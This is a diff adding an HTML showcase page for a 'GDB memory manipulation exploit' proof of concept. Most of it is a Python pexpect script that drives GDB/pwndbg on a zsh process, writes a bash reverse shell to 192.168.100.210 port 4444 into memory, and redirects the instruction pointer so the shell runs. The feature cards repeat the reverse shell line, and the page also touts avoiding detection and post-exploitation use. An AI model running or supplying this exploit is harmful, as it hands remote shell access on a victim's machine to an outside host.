@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced GDB Exploit Framework</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+            --dark: #1a1a1a;
+            --light: #ecf0f1;
+            --success: #2ecc71;
+            --warning: #f39c12;
+        }
+        
+        body {
+            font-family: 'Fira Code', 'Consolas', monospace;
+            background-color: var(--dark);
+            color: var(--light);
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 2rem 0;
+            border-radius: 0 0 20px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M0,0 L100,0 L100,100 L0,100 Z" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="2"/></svg>');
+            opacity: 0.3;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin: 0;
+            color: white;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+        
+        .tagline {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-top: 0.5rem;
+        }
+        
+        .card {
+            background: rgba(30, 30, 30, 0.8);
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border-left: 4px solid var(--secondary);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 0.5rem;
+        }
+        
+        .card-title {
+            font-size: 1.3rem;
+            color: var(--secondary);
+            margin: 0;
+        }
+        
+        .badge {
+            background-color: var(--accent);
+            color: white;
+            padding: 0.3rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+        
+        pre {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 1rem;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            margin: 1rem 0;
+            border-left: 3px solid var(--success);
+        }
+        
+        code {
+            color: var(--success);
+            font-family: inherit;
+        }
+        
+        .exploit-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        .feature {
+            background: rgba(40, 40, 40, 0.7);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-top: 3px solid var(--warning);
+        }
+        
+        .feature-title {
+            color: var(--warning);
+            margin-top: 0;
+        }
+        
+        .terminal {
+            background-color: #1e1e1e;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            margin: 2rem 0;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+        
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .terminal-dots {
+            display: flex;
+            margin-right: 1rem;
+        }
+        
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        
+        .dot-red { background-color: #ff5f56; }
+        .dot-yellow { background-color: #ffbd2e; }
+        .dot-green { background-color: #27c93f; }
+        
+        .terminal-title {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .terminal-content {
+            min-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .command { color: #56b6c2; }
+        .output { color: #abb2bf; }
+        .comment { color: #5c6370; font-style: italic; }
+        .string { color: #98c379; }
+        .keyword { color: #c678dd; }
+        .function { color: #61afef; }
+        .number { color: #d19a66; }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding: 1.5rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            .exploit-features {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>GDB Memory Manipulation Exploit</h1>
+            <p class="tagline">Advanced process manipulation through GDB debugging interface</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <h2 class="card-title">Exploit Overview</h2>
+                <span class="badge">POC</span>
+            </div>
+            <p>This exploit demonstrates advanced process manipulation through GDB's debugging interface, allowing for arbitrary memory writes, register control, and shellcode injection to achieve remote code execution.</p>
+            
+            <div class="terminal">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot dot-red"></div>
+                        <div class="dot dot-yellow"></div>
+                        <div class="dot dot-green"></div>
+                    </div>
+                    <div class="terminal-title">exploit.py</div>
+                </div>
+                <div class="terminal-content">
+                    <pre><code><span class="keyword">import</span> pexpect
+<span class="keyword">import</span> sys
+<span class="keyword">import</span> time
+<span class="keyword">import</span> signal
+<span class="keyword">import</span> os
+
+<span class="keyword">def</span> <span class="function">debug_print</span>(msg):
+    <span class="function">print</span>(<span class="string">f"[DEBUG] {msg}"</span>)
+
+<span class="keyword">def</span> <span class="function">clean_exit</span>(gdb):
+    <span class="comment">"""Gracefully exit all processes without hangup messages"""</span>
+    <span class="keyword">try</span>:
+        <span class="keyword">if</span> gdb.isalive():
+            <span class="comment"># First try clean quit</span>
+            gdb.sendline(<span class="string">'quit'</span>)
+            time.sleep(<span class="number">0.5</span>)
+            
+            <span class="comment"># Force terminate if still alive</span>
+            <span class="keyword">if</span> gdb.isalive():
+                gdb.kill(signal.SIGTERM)
+    <span class="keyword">except</span>:
+        <span class="keyword">pass</span>
+    <span class="keyword">finally</span>:
+        <span class="keyword">try</span>:
+            gdb.close(force=<span class="keyword">True</span>)
+        <span class="keyword">except</span>:
+            <span class="keyword">pass</span>
+        os._exit(<span class="number">0</span>)  <span class="comment"># Immediate exit to prevent any hangup signals</span>
+
+<span class="keyword">def</span> <span class="function">return_to_gdb</span>(gdb, max_attempts=<span class="number">3</span>, timeout=<span class="number">3</span>):
+    <span class="comment">"""Reliably return to GDB prompt"""</span>
+    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="function">range</span>(max_attempts):
+        gdb.sendcontrol(<span class="string">'c'</span>)  <span class="comment"># CTRL+C</span>
+        time.sleep(<span class="number">0.5</span>)
+        <span class="keyword">try</span>:
+            index = gdb.expect([<span class="string">'pwndbg>'</span>, <span class="string">r'\(gdb\)'</span>, pexpect.TIMEOUT], timeout=timeout)
+            <span class="keyword">if</span> index <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:
+                <span class="keyword">return</span> <span class="keyword">True</span>
+        <span class="keyword">except</span> pexpect.EOF:
+            <span class="keyword">return</span> <span class="keyword">False</span>
+    <span class="keyword">return</span> <span class="keyword">False</span>
+
+<span class="keyword">def</span> <span class="function">main</span>():
+    <span class="comment"># Start GDB with proper signal handling</span>
+    gdb = pexpect.spawn(<span class="string">'gdb -q --args zsh -f'</span>, 
+                       timeout=<span class="number">30</span>,
+                       encoding=<span class="string">'utf-8'</span>,
+                       ignore_sighup=<span class="keyword">True</span>)
+    gdb.logfile = sys.stdout
+
+    <span class="keyword">try</span>:
+        <span class="comment"># Initialize GDB</span>
+        gdb.expect(<span class="string">'pwndbg>'</span>, timeout=<span class="number">10</span>)
+        <span class="function">debug_print</span>(<span class="string">"GDB started successfully"</span>)
+
+        <span class="comment"># Run target program</span>
+        gdb.sendline(<span class="string">'run'</span>)
+        shell_prompts = [<span class="string">'%'</span>,<span class="string">'# '</span>, <span class="string">r'\$ '</span>, <span class="string">'vuln>'</span>,<span class="string">'vuln%'</span>]
+        <span class="keyword">try</span>:
+            gdb.expect(shell_prompts + [<span class="string">'pwndbg>'</span>], timeout=<span class="number">10</span>)
+        <span class="keyword">except</span> pexpect.TIMEOUT:
+            gdb.sendcontrol(<span class="string">'c'</span>)
+            time.sleep(<span class="number">1</span>)
+
+        <span class="comment"># Execute shell commands</span>
+        <span class="keyword">if</span> <span class="keyword">any</span>(prompt <span class="keyword">in</span> gdb.after <span class="keyword">for</span> prompt <span class="keyword">in</span> shell_prompts):
+            <span class="keyword">for</span> cmd <span class="keyword">in</span> [<span class="string">'!'</span>, <span class="string">'!!11111111111'</span>]:
+                gdb.sendline(cmd)
+                <span class="keyword">try</span>:
+                    gdb.expect(shell_prompts, timeout=<span class="number">3</span>)
+                <span class="keyword">except</span> pexpect.TIMEOUT:
+                    <span class="keyword">pass</span>
+
+            <span class="keyword">if</span> <span class="keyword">not</span> <span class="function">return_to_gdb</span>(gdb):
+                <span class="function">debug_print</span>(<span class="string">"Failed to return to GDB"</span>)
+                <span class="function">clean_exit</span>(gdb)
+                <span class="keyword">return</span>
+
+        <span class="comment"># Memory operations</span>
+        <span class="keyword">if</span> <span class="string">'pwndbg>'</span> <span class="keyword">in</span> gdb.after:
+            commands = [
+                <span class="string">'x/s 0x555555659000'</span>,
+                <span class="string">r'set {char[120]} 0x555555659000 = "bash -c \"bash -i >& /dev/tcp/192.168.100.210/4444 0>&1\""'</span>,
+                <span class="string">'set {long}0x7fffffffd868 = 0x7ffff7cc9110'</span>,
+                <span class="string">'set $rdi = 0x555555659000'</span>,
+                <span class="string">'set $rsp = $rsp - 8'</span>,
+                <span class="string">'continue'</span>,
+                <span class="string">'set {long}$rsp = 0x55555555a000'</span>,
+                <span class="string">'set $rip = 0x7ffff7cc9110'</span>,
+                <span class="string">'set $rdi = 0x555555659000'</span>,
+                <span class="string">'continue'</span>
+            ]
+
+            <span class="keyword">for</span> cmd <span class="keyword">in</span> commands:
+                gdb.sendline(cmd)
+                <span class="keyword">try</span>:
+                    <span class="keyword">if</span> <span class="string">'continue'</span> <span class="keyword">in</span> cmd:
+                        gdb.expect([<span class="string">'pwndbg>'</span>] + shell_prompts, timeout=<span class="number">15</span>)
+                    <span class="keyword">else</span>:
+                        gdb.expect(<span class="string">'pwndbg>'</span>, timeout=<span class="number">5</span>)
+                <span class="keyword">except</span> pexpect.TIMEOUT:
+                    <span class="keyword">if</span> <span class="keyword">not</span> <span class="function">return_to_gdb</span>(gdb):
+                        <span class="keyword">break</span>
+
+        <span class="comment"># Interactive session with clean exit handling</span>
+        <span class="function">print</span>(<span class="string">"\n[+] EXPLOIT COMPLETE - GDB SESSION ACTIVE"</span>)
+        <span class="function">print</span>(<span class="string">"[+] Type 'exit' to quit cleanly"</span>)
+        <span class="function">print</span>(<span class="string">"[+] Press CTRL+C to return to prompt\n"</span>)
+
+        <span class="keyword">while</span> <span class="keyword">True</span>:
+            <span class="keyword">try</span>:
+                <span class="keyword">if</span> <span class="keyword">not</span> gdb.isalive():
+                    <span class="keyword">break</span>
+                    
+                gdb.expect([<span class="string">'pwndbg>'</span>, <span class="string">r'\(gdb\)'</span>], timeout=<span class="keyword">None</span>)
+                <span class="function">print</span>(gdb.before, end=<span class="string">''</span>)
+                
+                cmd = <span class="function">input</span>().strip()
+                <span class="keyword">if</span> cmd.lower() == <span class="string">'exit'</span>:
+                    <span class="comment"># This will completely prevent the hangup message</span>
+                    <span class="function">clean_exit</span>(gdb)
+                    
+                gdb.sendline(cmd)
+                
+            <span class="keyword">except</span> KeyboardInterrupt:
+                <span class="function">print</span>(<span class="string">"\n[!] Press CTRL+C again to abort or continue typing commands"</span>)
+                <span class="keyword">continue</span>
+            <span class="keyword">except</span> pexpect.EOF:
+                <span class="keyword">break</span>
+            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+                <span class="function">debug_print</span>(<span class="string">f"Error: {e}"</span>)
+                <span class="keyword">break</span>
+
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="function">debug_print</span>(<span class="string">f"Fatal error: {e}"</span>)
+    <span class="keyword">finally</span>:
+        <span class="function">clean_exit</span>(gdb)
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    <span class="function">main</span>()</code></pre>
+                </div>
+            </div>
+        </div>
+        
+        <div class="exploit-features">
+            <div class="feature">
+                <h3 class="feature-title">Advanced Memory Manipulation</h3>
+                <p>Direct memory writes to inject shellcode and modify critical process memory regions for control flow hijacking.</p>
+                <pre><code><span class="command">set {char[120]} 0x555555659000 = "bash -c \"bash -i >& /dev/tcp/192.168.100.210/4444 0>&1\""</span></code></pre>
+            </div>
+            
+            <div class="feature">
+                <h3 class="feature-title">Register Control</h3>
+                <p>Full control over CPU registers to redirect execution and set up function call parameters.</p>
+                <pre><code><span class="command">set $rip = 0x7ffff7cc9110</span>
+<span class="command">set $rdi = 0x555555659000</span>
+<span class="command">set $rsp = $rsp - 8</span></code></pre>
+            </div>
+            
+            <div class="feature">
+                <h3 class="feature-title">Robust Process Handling</h3>
+                <p>Graceful process management with clean exit routines to prevent hangup signals and orphaned processes.</p>
+                <pre><code><span class="keyword">def</span> <span class="function">clean_exit</span>(gdb):
+    <span class="comment"># First try clean quit</span>
+    gdb.sendline(<span class="string">'quit'</span>)
+    time.sleep(<span class="number">0.5</span>)
+    
+    <span class="comment"># Force terminate if still alive</span>
+    <span class="keyword">if</span> gdb.isalive():
+        gdb.kill(signal.SIGTERM)</code></pre>
+            </div>
+            
+            <div class="feature">
+                <h3 class="feature-title">Interactive Session</h3>
+                <p>Maintains interactive GDB session after exploitation for post-exploitation activities.</p>
+                <pre><code><span class="output">[+] EXPLOIT COMPLETE - GDB SESSION ACTIVE</span>
+<span class="output">[+] Type 'exit' to quit cleanly</span>
+<span class="output">[+] Press CTRL+C to return to prompt</span></code></pre>
+            </div>
+            
+            <div class="feature">
+                <h3 class="feature-title">Shell Command Execution</h3>
+                <p>Execute arbitrary shell commands within the target process context before memory manipulation.</p>
+                <pre><code><span class="keyword">for</span> cmd <span class="keyword">in</span> [<span class="string">'!'</span>, <span class="string">'!!11111111111'</span>]:
+    gdb.sendline(cmd)
+    <span class="keyword">try</span>:
+        gdb.expect(shell_prompts, timeout=<span class="number">3</span>)
+    <span class="keyword">except</span> pexpect.TIMEOUT:
+        <span class="keyword">pass</span></code></pre>
+            </div>
+            
+            <div class="feature">
+                <h3 class="feature-title">Reliable GDB Control</h3>
+                <p>Robust mechanisms to return to GDB prompt and handle unexpected states during exploitation.</p>
+                <pre><code><span class="keyword">def</span> <span class="function">return_to_gdb</span>(gdb, max_attempts=<span class="number">3</span>, timeout=<span class="number">3</span>):
+    <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="function">range</span>(max_attempts):
+        gdb.sendcontrol(<span class="string">'c'</span>)  <span class="comment"># CTRL+C</span>
+        time.sleep(<span class="number">0.5</span>)
+        <span class="keyword">try</span>:
+            index = gdb.expect([<span class="string">'pwndbg>'</span>, <span class="string">r'\(gdb\)'</span>], timeout=timeout)
+            <span class="keyword">if</span> index <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:
+                <span class="keyword">return</span> <span class="keyword">True</span></code></pre>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-header">
+                <h2 class="card-title">Technical Details</h2>
+            </div>
+            <p>This exploit leverages GDB's powerful debugging capabilities to:</p>
+            <ul>
+                <li>Inject a reverse shell payload into process memory</li>
+                <li>Modify the instruction pointer (RIP) to redirect execution</li>
+                <li>Set up function call parameters in registers (RDI, RSP)</li>
+                <li>Execute the payload while maintaining process stability</li>
+                <li>Provide an interactive debugging session post-exploitation</li>
+            </ul>
+            
+            <p>The exploit demonstrates advanced techniques for:</p>
+            <ul>
+                <li>Process state recovery when commands time out</li>
+                <li>Clean process termination to avoid detection</li>
+                <li>Interactive session management</li>
+                <li>Memory inspection and modification</li>
+            </ul>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>Advanced GDB Exploit Framework | Proof of Concept | For Educational Purposes Only</p>
+            <p>© 2023 Security Research Team</p>
+        </div>
+    </footer>
+</body>
+</html>
